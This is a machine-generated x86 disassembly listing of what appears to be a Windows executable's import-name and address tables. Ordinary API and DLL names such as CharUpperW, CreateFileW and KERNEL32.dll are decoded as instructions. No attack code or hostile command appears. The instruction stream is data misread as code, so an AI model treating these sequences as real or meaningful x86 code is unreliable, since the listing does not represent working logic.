  428930:	add    BYTE PTR [eax],al
  428932:	cmp    BYTE PTR [eax],al
  428934:	inc    ebx
  428935:	push   0x70557261
  42893a:	jo     0x4289a1
  42893c:	jb     0x428980
  42893e:	jne    0x4289a6
  428940:	push   di
  428942:	add    BYTE PTR [eax],al
  428944:	daa    
  428945:	add    DWORD PTR [edi+0x65],eax
  428948:	je     0x428995
  42894a:	gs jns 0x4289af
  42894d:	outs   dx,DWORD PTR ds:[esi]
  42894e:	popa   
  42894f:	jb     0x4289b5
  428951:	push   esp
  428952:	jns    0x4289c4
  428954:	add    BYTE PTR gs:[ebx+0x1],cl
  428958:	inc    edi
  428959:	gs je  0x4289ac
  42895c:	jb     0x4289cd
  42895e:	jo     0x4289b7
  428960:	add    BYTE PTR [eax],al
  428962:	dec    ebp
  428963:	add    BYTE PTR [ebx+0x6f],al
  428966:	jo     0x4289e1
  428968:	push   edx
  428969:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42896e:	sub    eax,0x61684300
  428973:	jb     0x4289c3
  428975:	gs js  0x4289ec
  428978:	push   edi
  428979:	add    BYTE PTR [eax+0x43734901],dl
  42897f:	push   0x6f4c7261
  428984:	ja     0x4289eb
  428986:	jb     0x4289c9
  428988:	add    BYTE PTR [eax],al
  42898a:	sub    BYTE PTR [ecx],al
  42898c:	inc    edi
  42898d:	gs je  0x4289dc
  428990:	popa   
  428991:	jae    0x428a07
  428993:	inc    ecx
  428994:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428998:	gs push eax
  42899a:	outs   dx,DWORD PTR ds:[esi]
  42899b:	jo     0x428a12
  42899d:	jo     0x42899f
  42899f:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289a5:	fs push ebx
  4289a7:	je     0x428a1b
  4289a9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289b0:	inc    edi
  4289b1:	gs je  0x428a0b
  4289b4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289bb:	outs   dx,BYTE PTR ds:[esi]
  4289bc:	addr16 push edi
  4289be:	add    BYTE PTR [eax],al
  4289c0:	leave  
  4289c1:	add    DWORD PTR [ebp+0x61],ecx
  4289c4:	jo     0x428a1d
  4289c6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289cd:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289d4:	inc    ebx
  4289d5:	push   0x6f547261
  4289da:	dec    edi
  4289db:	gs ins DWORD PTR es:[edi],dx
  4289dd:	push   edi
  4289de:	add    BYTE PTR [eax],al
  4289e0:	push   ebp
  4289e1:	push   ebx
  4289e2:	inc    ebp
  4289e3:	push   edx
  4289e4:	xor    esi,DWORD PTR [edx]
  4289e6:	cs fs ins BYTE PTR es:[edi],dx
  4289e9:	ins    BYTE PTR es:[edi],dx
  4289ea:	add    BYTE PTR [eax],al
  4289ec:	xchg   edx,eax
  4289ed:	add    edx,DWORD PTR [edx+0x74]
  4289f0:	ins    BYTE PTR es:[edi],dx
  4289f1:	dec    ecx
  4289f2:	outs   dx,BYTE PTR ds:[esi]
  4289f3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289fb:	jb     0x428a66
  4289fd:	outs   dx,BYTE PTR ds:[esi]
  4289fe:	add    BYTE PTR [bp+0x74],ch
  428a02:	fs ins BYTE PTR es:[edi],dx
  428a04:	ins    BYTE PTR es:[edi],dx
  428a05:	cs fs ins BYTE PTR es:[edi],dx
  428a08:	ins    BYTE PTR es:[edi],dx
  428a09:	add    BYTE PTR ds:0x74654702,al
  428a0f:	dec    esp
  428a10:	outs   dx,DWORD PTR ds:[esi]
  428a11:	arpl   WORD PTR [ecx+0x6c],sp
  428a14:	gs dec ecx
  428a16:	outs   dx,BYTE PTR ds:[esi]
  428a17:	outs   dx,WORD PTR ds:[esi]
  428a19:	push   edi
  428a1a:	add    BYTE PTR [eax],al
  428a1c:	inc    ebp
  428a1d:	add    al,BYTE PTR [edi+0x65]
  428a20:	je     0x428a72
  428a22:	jb     0x428a93
  428a24:	arpl   WORD PTR [ecx+0x64],ax
  428a27:	fs jb  0x428a8f
  428a2a:	jae    0x428a9f
  428a2c:	add    BYTE PTR [eax],al
  428a2e:	rol    DWORD PTR [eax],cl
  428a30:	inc    ebx
  428a31:	jb     0x428a98
  428a33:	popa   
  428a34:	je     0x428a9b
  428a36:	inc    esi
  428a37:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a3f:	outs   dx,BYTE PTR ds:[esi]
  428a40:	addr16 push edi
  428a42:	add    BYTE PTR [eax],al
  428a44:	sub    BYTE PTR [ebx+edx*2],al
  428a47:	gs je  0x428a92
  428a4a:	popa   
  428a4b:	outs   dx,BYTE PTR ds:[esi]
  428a4c:	fs ins BYTE PTR es:[edi],dx
  428a4e:	gs inc ebx
  428a50:	outs   dx,DWORD PTR ds:[esi]
  428a51:	jne    0x428ac1
  428a53:	je     0x428a55
  428a55:	add    ah,bl
  428a57:	add    BYTE PTR [ebx+0x72],al
  428a5a:	gs popa 
  428a5c:	je     0x428ac3
  428a5e:	dec    ebp
  428a5f:	popa   
  428a60:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a68:	pop    DWORD PTR [ecx]
  428a6a:	inc    edi
  428a6b:	gs je  0x428aaf
  428a6e:	je     0x428adf
  428a70:	ins    DWORD PTR es:[edi],dx
  428a71:	dec    esi
  428a72:	popa   
  428a73:	ins    DWORD PTR es:[edi],dx
  428a74:	gs inc ecx
  428a76:	add    BYTE PTR [eax],al
  428a78:	pusha  
  428a79:	add    al,BYTE PTR [edi+0x65]
  428a7c:	je     0x428ad1
  428a7e:	jns    0x428af3
  428a80:	je     0x428ae7
  428a82:	ins    DWORD PTR es:[edi],dx
  428a83:	push   edi
  428a84:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a8b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a92:	jns    0x428ad5
  428a94:	add    BYTE PTR [eax],al
  428a96:	aas    
  428a97:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a9b:	fs dec esp
  428a9d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428aa4:	add    BYTE PTR [eax],al
  428aa6:	xchg   ecx,eax
  428aa7:	add    al,BYTE PTR [edi+0x6c]
  428aaa:	outs   dx,DWORD PTR ds:[esi]
  428aab:	bound  esp,QWORD PTR [ecx+0x6c]
  428aae:	inc    ecx
  428aaf:	ins    BYTE PTR es:[edi],dx
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	outs   dx,DWORD PTR ds:[esi]
  428ab2:	arpl   WORD PTR [eax],ax
  428ab4:	xchg   edx,eax
  428ab5:	add    al,0x56
  428ab7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428abe:	jne    0x428b25
  428ac0:	jb     0x428b3b
  428ac2:	add    BYTE PTR [eax],al
  428ac4:	test   DWORD PTR [ecx],0x46746547
  428aca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ad2:	jb     0x428ad5
  428ad4:	inc    esi
  428ad5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428adc:	jne    0x428b50
  428ade:	arpl   WORD PTR [ebp+0x57],sp
  428ae1:	add    BYTE PTR [eax],bh
  428ae3:	add    ecx,DWORD PTR [ebp+0x6f]
  428ae6:	jbe    0x428b4d
  428ae8:	inc    esi
  428ae9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428af1:	popa   
  428af2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428af9:	jo     0x428b6f
  428afb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b02:	inc    edi
  428b03:	gs je  0x428b48
  428b06:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b0d:	jo     0x428b74
  428b0f:	inc    ecx
  428b10:	add    BYTE PTR [eax],al
  428b12:	and    DWORD PTR [ebx+edx*2],eax
  428b15:	gs je  0x428b5e
  428b18:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b20:	bound  esi,QWORD PTR [ebp+0x74]
  428b23:	gs jae 0x428b67
  428b26:	add    BYTE PTR [eax],al
  428b28:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b2c:	jbe    0x428b93
  428b2e:	inc    esi
  428b2f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b37:	add    BYTE PTR [ebx+0x6f],al
  428b3a:	jo     0x428bb5
  428b3c:	inc    esi
  428b3d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b45:	jne    0x428bac
  428b47:	jb     0x428bc2
  428b49:	push   eax
  428b4a:	gs jb  0x428bb3
  428b4d:	outs   dx,DWORD PTR ds:[esi]
  428b4e:	jb     0x428bbd
  428b50:	popa   
  428b51:	outs   dx,BYTE PTR ds:[esi]
  428b52:	arpl   WORD PTR [ebp+0x43],sp
  428b55:	outs   dx,DWORD PTR ds:[esi]
  428b56:	jne    0x428bc6
  428b58:	je     0x428bbf
  428b5a:	jb     0x428b5c
  428b5c:	sub    DWORD PTR [ebx+edx*2],eax
  428b5f:	gs je  0x428baa
  428b62:	popa   
  428b63:	outs   dx,BYTE PTR ds:[esi]
  428b64:	fs ins BYTE PTR es:[edi],dx
  428b66:	gs dec ecx
  428b68:	outs   dx,BYTE PTR ds:[esi]
  428b69:	outs   dx,WORD PTR ds:[esi]
  428b6b:	jb     0x428bda
  428b6d:	popa   
  428b6e:	je     0x428bd9
  428b70:	outs   dx,DWORD PTR ds:[esi]
  428b71:	outs   dx,BYTE PTR ds:[esi]
  428b72:	add    BYTE PTR [eax],al
  428b74:	push   ss
  428b75:	add    DWORD PTR [ebp+0x6e],eax
  428b78:	je     0x428bdf
  428b7a:	jb     0x428bbf
  428b7c:	jb     0x428be7
  428b7e:	je     0x428be9
  428b80:	arpl   WORD PTR [ecx+0x6c],sp
  428b83:	push   ebx
  428b84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b89:	outs   dx,BYTE PTR ds:[esi]
  428b8a:	add    BYTE PTR [eax],al
  428b8c:	jg     0x428b8f
  428b8e:	inc    esi
  428b8f:	outs   dx,DWORD PTR ds:[esi]
  428b90:	ins    BYTE PTR es:[edi],dx
  428b91:	fs push ebx
  428b93:	je     0x428c07
  428b95:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b9c:	ins    BYTE PTR es:[edi],dx
  428b9d:	jae    0x428c13
  428b9f:	jb     0x428c0d
  428ba1:	outs   dx,BYTE PTR gs:[esi]
  428ba3:	inc    ecx
  428ba4:	add    BYTE PTR [eax],al
  428ba6:	sahf   
  428ba7:	add    DWORD PTR [edi+0x65],eax
  428baa:	je     0x428bef
  428bac:	outs   dx,DWORD PTR ds:[esi]
  428bad:	ins    DWORD PTR es:[edi],dx
  428bae:	ins    DWORD PTR es:[edi],dx
  428baf:	push   esp
  428bb0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bb7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bbb:	gs je  0x428c12
  428bbe:	push   0x64616572
  428bc3:	push   esp
  428bc4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bcb:	inc    ebp
  428bcc:	push   edx
  428bcd:	dec    esi
  428bce:	inc    ebp
  428bcf:	dec    esp
  428bd0:	xor    esi,DWORD PTR [edx]
  428bd2:	cs fs ins BYTE PTR es:[edi],dx
  428bd5:	ins    BYTE PTR es:[edi],dx
  428bd6:	add    BYTE PTR [eax],al
  428bd8:	mov    dh,0x1
  428bda:	push   eax
  428bdb:	outs   dx,DWORD PTR ds:[esi]
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	jns    0x428c46
  428bdf:	outs   dx,DWORD PTR ds:[esi]
  428be0:	outs   dx,BYTE PTR ds:[esi]
  428be1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428be5:	gs je  0x428c37
  428be8:	bound  ebp,QWORD PTR [edx+0x65]
  428beb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bef:	add    BYTE PTR [ebx+0x6c654400],dh
  428bf5:	gs je  0x428c5d
  428bf8:	inc    esp
  428bf9:	inc    ebx
  428bfa:	add    BYTE PTR [eax],al
  428bfc:	rol    DWORD PTR [ecx],1
  428bfe:	push   ebx
  428bff:	gs ins BYTE PTR es:[edi],dx
  428c01:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c06:	push   0x65
  428c08:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c0c:	jmp    0x428c0f
  428c0e:	push   ebx
  428c0f:	gs je  0x428c5f
  428c12:	popa   
  428c13:	jo     0x428c62
  428c15:	outs   dx,DWORD PTR ds:[esi]
  428c16:	fs add BYTE PTR gs:[eax],al
  428c1a:	leave  
  428c1b:	add    DWORD PTR [edx+0x6f],edx
  428c1e:	jne    0x428c8e
  428c20:	fs push edx
  428c22:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c27:	add    BYTE PTR [edx+0x69],al
  428c2a:	je     0x428c6e
  428c2c:	ins    BYTE PTR es:[edi],dx
  428c2d:	je     0x428c2f
  428c2f:	add    BYTE PTR [ebx+0x61655201],bh
  428c35:	ins    BYTE PTR es:[edi],dx
  428c36:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c3d:	je     0x428cb3
  428c3f:	add    BYTE PTR gs:[eax],al
  428c42:	jge    0x428c45
  428c44:	inc    edi
  428c45:	gs je  0x428c9b
  428c48:	jns    0x428cbd
  428c4a:	je     0x428cb1
  428c4c:	ins    DWORD PTR es:[edi],dx
  428c4d:	push   eax
  428c4e:	popa   
  428c4f:	ins    BYTE PTR es:[edi],dx
  428c50:	gs je  0x428cc7
  428c53:	gs push ebp
  428c55:	jae    0x428cbc
  428c57:	add    BYTE PTR [eax+0x74654701],cl
  428c5d:	push   esp
  428c5e:	gs js  0x428cd5
  428c61:	inc    ebp
  428c62:	js     0x428cd8
  428c64:	outs   dx,BYTE PTR gs:[esi]
  428c66:	je     0x428cb8
  428c68:	outs   dx,DWORD PTR ds:[esi]
  428c69:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c70:	push   ebx
  428c71:	arpl   WORD PTR [ecx+0x6c],sp
  428c74:	gs push esi
  428c76:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c7d:	inc    ebp
  428c7e:	js     0x428cf4
  428c80:	inc    ebp
  428c81:	js     0x428c83
  428c83:	add    bh,cl
  428c85:	add    DWORD PTR [ebx+0x65],edx
  428c88:	ins    BYTE PTR es:[edi],dx
  428c89:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c8e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c95:	add    DWORD PTR [ebx+0x65],edx
  428c98:	je     0x428cee
  428c9a:	gs js  0x428d11
  428c9d:	inc    ebx
  428c9e:	outs   dx,DWORD PTR ds:[esi]
  428c9f:	ins    BYTE PTR es:[edi],dx
  428ca0:	outs   dx,DWORD PTR ds:[esi]
  428ca1:	jb     0x428ca3
  428ca3:	add    BYTE PTR [eax+0x74615001],ch
  428ca9:	push   0x65526f54
  428cae:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cb6:	inc    ebx
  428cb7:	outs   dx,DWORD PTR ds:[esi]
  428cb8:	ins    DWORD PTR es:[edi],dx
  428cb9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428cbc:	gs push edx
  428cbe:	outs   dx,BYTE PTR ds:[si]
  428cc0:	add    BYTE PTR [eax],al
  428cc2:	lods   al,BYTE PTR ds:[esi]
  428cc3:	add    BYTE PTR [ebx+0x72],al
  428cc6:	gs popa 
  428cc8:	je     0x428d2f
  428cca:	push   edx
  428ccb:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428cd0:	outs   dx,BYTE PTR ds:[esi]
  428cd1:	dec    ecx
  428cd2:	outs   dx,BYTE PTR ds:[esi]
  428cd3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428cdb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cdf:	gs push esp
  428ce1:	outs   dx,DWORD PTR ds:[esi]
  428ce2:	add    BYTE PTR [eax],al
  428ce4:	mov    ds:0x65724300,al
  428ce9:	popa   
  428cea:	je     0x428d51
  428cec:	dec    ecx
  428ced:	inc    ebx
  428cee:	push   edi
  428cef:	add    BYTE PTR [ebp+0x63655201],bh
  428cf5:	je     0x428d4d
  428cf7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cff:	add    BYTE PTR [ebx+0x72],al
  428d02:	gs popa 
  428d04:	je     0x428d6b
  428d06:	push   eax
  428d07:	popa   
  428d08:	ins    BYTE PTR es:[edi],dx
  428d09:	gs je  0x428d80
  428d0c:	add    BYTE PTR gs:[edi+0x44],al
  428d10:	dec    ecx
  428d11:	xor    esi,DWORD PTR [edx]
  428d13:	cs fs ins BYTE PTR es:[edi],dx
  428d16:	ins    BYTE PTR es:[edi],dx
	...
  428d1f:	add    BYTE PTR [eax+0x20],ch
  428d22:	add    al,BYTE PTR [eax]
	...
  428d40:	pop    ebx
  428d41:	lea    eax,[edx]
	...
  428d4f:	add    BYTE PTR [ecx+0x64],ch
  428d52:	js     0x428dbd
  428d54:	outs   dx,DWORD PTR fs:[esi]
  428d56:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d5a:	add    BYTE PTR [ebx+0x65],dl
  428d5d:	je     0x428da0
  428d5f:	outs   dx,BYTE PTR ds:[esi]
  428d60:	arpl   WORD PTR [eax+0x6f],bp
  428d63:	jb     0x428db4
  428d65:	jb     0x428dd0
  428d67:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d6f:	add    BYTE PTR [eax],al
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    al,ch
  428d75:	test   DWORD PTR [edx],eax
  428d77:	add    BYTE PTR [esi+eax*4],al
  428d7a:	add    al,BYTE PTR [eax]
  428d7c:	push   ss
  428d7d:	xchg   BYTE PTR [edx],al
  428d7f:	add    BYTE PTR [eax],ch
  428d81:	xchg   BYTE PTR [edx],al
  428d83:	add    BYTE PTR [eax-0x7a],al
  428d86:	add    al,BYTE PTR [eax]
  428d88:	push   esp
  428d89:	xchg   BYTE PTR [edx],al
  428d8b:	add    BYTE PTR [esi-0x7a],ch
  428d8e:	add    al,BYTE PTR [eax]
  428d90:	add    BYTE PTR [eax],al
  428d92:	add    BYTE PTR [eax],al
  428d94:	nop
  428d95:	xchg   BYTE PTR [edx],al
  428d97:	add    BYTE PTR [esi-0x43fffd7a],ch
  428d9d:	xchg   BYTE PTR [edx],al
  428d9f:	add    dl,cl
  428da1:	xchg   BYTE PTR [edx],al
  428da3:	add    dh,bl
  428da5:	xchg   BYTE PTR [edx],al
  428da7:	add    ah,ch
  428da9:	xchg   BYTE PTR [edx],al
  428dab:	add    dh,bh
  428dad:	xchg   BYTE PTR [edx],al
  428daf:	add    BYTE PTR [eax],dl
  428db1:	xchg   DWORD PTR [edx],eax
  428db3:	add    BYTE PTR [esi],bl
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    BYTE PTR [eax],dh
  428db9:	xchg   DWORD PTR [edx],eax
  428dbb:	add    BYTE PTR [edx-0x79],al
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	push   eax
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    BYTE PTR [esi-0x79],bl
  428dc6:	add    al,BYTE PTR [eax]
  428dc8:	jo     0x428d51
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	jl     0x428d55
  428dce:	add    al,BYTE PTR [eax]
  428dd0:	xchg   edx,eax
  428dd1:	xchg   DWORD PTR [edx],eax
  428dd3:	add    BYTE PTR [edi+eax*4-0x7849fffe],ah
  428dda:	add    al,BYTE PTR [eax]
  428ddc:	ret    0x287
  428ddf:	add    dl,dl
  428de1:	xchg   DWORD PTR [edx],eax
  428de3:	add    dl,ah
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    al,bh
  428de9:	xchg   DWORD PTR [edx],eax
  428deb:	add    BYTE PTR [eax+ecx*4],al
  428dee:	add    al,BYTE PTR [eax]
  428df0:	push   ss
  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [eax+ecx*4],ch
  428df6:	add    al,BYTE PTR [eax]
  428df8:	mov    BYTE PTR ds:[edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4+0x2],cl
  428dff:	add    BYTE PTR [eax+ecx*4+0x2],bl
  428e03:	add    BYTE PTR [esi-0x78],ch
  428e06:	add    al,BYTE PTR [eax]
  428e08:	or     BYTE PTR [eax-0x7767fffe],0x2
  428e0f:	add    BYTE PTR [edx-0x43fffd78],ch
  428e15:	mov    BYTE PTR [edx],al
  428e17:	add    ah,cl
  428e19:	mov    BYTE PTR [edx],al
  428e1b:	add    ah,bl
  428e1d:	mov    BYTE PTR [edx],al
  428e1f:	add    ah,ch
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    dh,bh
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    BYTE PTR [ecx+ecx*4],cl
  428e2a:	add    al,BYTE PTR [eax]
  428e2c:	sbb    cl,BYTE PTR [ecx-0x76cdfffe]
  428e32:	add    al,BYTE PTR [eax]
  428e34:	inc    esp
  428e35:	mov    DWORD PTR [edx],eax
  428e37:	add    BYTE PTR [esi-0x77],dl
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	bound  ecx,QWORD PTR [ecx-0x7691fffe]
  428e42:	add    al,BYTE PTR [eax]
  428e44:	jp     0x428dcf
  428e46:	add    al,BYTE PTR [eax]
  428e48:	mov    cl,BYTE PTR [ecx-0x765ffffe]
  428e4e:	add    al,BYTE PTR [eax]
  428e50:	scas   al,BYTE PTR es:[edi]
  428e51:	mov    DWORD PTR [edx],eax
  428e53:	add    al,al
  428e55:	mov    DWORD PTR [edx],eax
  428e57:	add    dl,dl
  428e59:	mov    DWORD PTR [edx],eax
  428e5b:	add    BYTE PTR [eax],al
  428e5d:	add    BYTE PTR [eax],al
  428e5f:	add    ah,ch
  428e61:	mov    DWORD PTR [edx],eax
  428e63:	add    BYTE PTR [eax],al
  428e65:	add    BYTE PTR [eax],al
  428e67:	add    BYTE PTR [edx],cl
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    BYTE PTR [edx+ecx*4],bl
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	mov    al,BYTE PTR cs:[edx]
  428e73:	add    BYTE PTR [edx+ecx*4+0x2],al
  428e77:	add    BYTE PTR [esi-0x76],dl
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	push   0x7800028a
  428e81:	mov    al,BYTE PTR [edx]
  428e83:	add    BYTE PTR [esi-0x59fffd76],dl
  428e89:	mov    al,BYTE PTR [edx]
  428e8b:	add    BYTE PTR [edx+ecx*4-0x753bfffe],dh
  428e92:	add    al,BYTE PTR [eax]
  428e94:	ror    BYTE PTR [edx-0x751dfffe],cl
  428e9a:	add    al,BYTE PTR [eax]
  428e9c:	out    dx,al
  428e9d:	mov    al,BYTE PTR [edx]
  428e9f:	add    BYTE PTR [eax],al
  428ea1:	mov    eax,DWORD PTR [edx]
  428ea3:	add    BYTE PTR [edx],dl
  428ea5:	mov    eax,DWORD PTR [edx]
  428ea7:	add    BYTE PTR [eax],ch
  428ea9:	mov    eax,DWORD PTR [edx]
  428eab:	add    BYTE PTR [esi],dh
  428ead:	mov    eax,DWORD PTR [edx]
  428eaf:	add    BYTE PTR [edx-0x75],al
  428eb2:	add    al,BYTE PTR [eax]
  428eb4:	pop    esp
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  428ebb:	add    BYTE PTR [ebx+ecx*4-0x7465fffe],cl
  428ec2:	add    al,BYTE PTR [eax]
  428ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ec5:	mov    eax,DWORD PTR [edx]
  428ec7:	add    BYTE PTR [eax+0x28b],bh
  428ecd:	add    BYTE PTR [eax],al
  428ecf:	add    al,bl
  428ed1:	mov    eax,DWORD PTR [edx]
  428ed3:	add    dl,ah
  428ed5:	mov    eax,DWORD PTR [edx]
  428ed7:	add    al,dh
  428ed9:	mov    eax,DWORD PTR [edx]
  428edb:	add    ah,bh
  428edd:	mov    eax,DWORD PTR [edx]
  428edf:	add    BYTE PTR [esp+ecx*4],cl
  428ee2:	add    al,BYTE PTR [eax]
  428ee4:	sbb    cl,BYTE PTR [edx+eax*1+0x28c2600]
  428eeb:	add    BYTE PTR [eax],dh
  428eed:	mov    WORD PTR [edx],es
  428eef:	add    BYTE PTR [edx-0x74],al
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	pop    eax
  428ef5:	mov    WORD PTR [edx],es
  428ef7:	add    BYTE PTR [esi-0x74],ch
  428efa:	add    al,BYTE PTR [eax]
  428efc:	test   BYTE PTR [edx+eax*1+0x28c9400],cl
  428f03:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  428f0a:	add    al,BYTE PTR [eax]
  428f0c:	ret    0x28c
  428f0f:	add    dl,bl
  428f11:	mov    WORD PTR [edx],es
  428f13:	add    ah,ah
  428f15:	mov    WORD PTR [edx],es
  428f17:	add    al,dh
  428f19:	mov    WORD PTR [edx],es
  428f1b:	add    dh,bh
  428f1d:	mov    WORD PTR [edx],es
  428f1f:	add    BYTE PTR [eax],al
  428f21:	add    BYTE PTR [eax],al
	...
